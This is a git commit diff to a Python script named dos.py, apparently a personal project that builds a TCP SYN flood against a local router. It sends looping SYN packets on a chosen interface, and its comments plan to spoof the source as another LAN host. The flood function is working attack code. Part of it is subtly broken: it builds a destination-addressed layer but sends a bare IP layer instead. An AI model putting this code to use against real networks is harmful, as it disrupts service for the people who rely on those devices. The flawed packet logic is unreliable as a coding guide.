4840c74a18a2ed7185fe2b2b32b67c3062484aa5
KarthikB-dev <saberlight35@gmail.com>
2021-08-29 16:27:34 -0700

    Rework planned design: dict with all require values

--- dos.py
+++ dos.py
@@ -11,18 +11,19 @@ def is_ipv6(address):
 
 
 # Generates SYN flood
-def spam_router(router_mac, router_ip):
+# TODO make this get the spoofed source (if possible)
+def spam_router(router_mac, router_ip, interface):
     e = Ether(dst=router_mac)
     t = TCP(flags="S")
     i = IPv6() if is_ipv6(router_ip) else IP()
     i.dst = router_ip
     # continuously sends packets → creates flood
     # TODO add the iface (may be needed for wired LANs)
-    sendp(e / IP() / t, loop=1)
+    sendp(e / IP() / t, loop=1, iface=interface)
 
 
 # Finds MAC and IP addresses in the text files
-def extract_mac_IP_pair():
+def extract_hostname_info():
     with open("arp_query.txt") as fin:
         arp_lines = fin.readlines()
     with open("hostname_ARP.txt") as fin:
@@ -37,21 +38,24 @@ def extract_mac_IP_pair():
         split_arp_lines.append(arp_line.split())
     # gets the IP and MAC address tuple for a given hostname
     # should get iface as well
-    hostname_to_IP_MAC = {}
+    # basically, get all the information provided in the text file
+    # Key: the hostname
+    # Value: another dict with all other information
+    hostname_info_dict = {}
     # TODO extract MAC and IP addresses with regex
-    return hostname_to_IP_MAC
+    return hostname_info_dict
 
 
 # If the length of the dictionary is more than 1,
 # then the destination of the SYN flood could be
 # a given devince on your LAN, and the source
 # could be spoofed as another computer
-def can_spoof(hostname_to_IP_MAC):
-    return len(hostname_to_IP_MAC) > 1
+def can_spoof(hostname_info_dict):
+    return len(hostname_info_dict) > 1
 
 
 def main():
-    address_dict = extract_mac_IP_pair()
+    address_dict = extract_hostname_info()
     # TODO use extract MAC IP pair function to find
     # addresses of networked computers
     # spam_router()
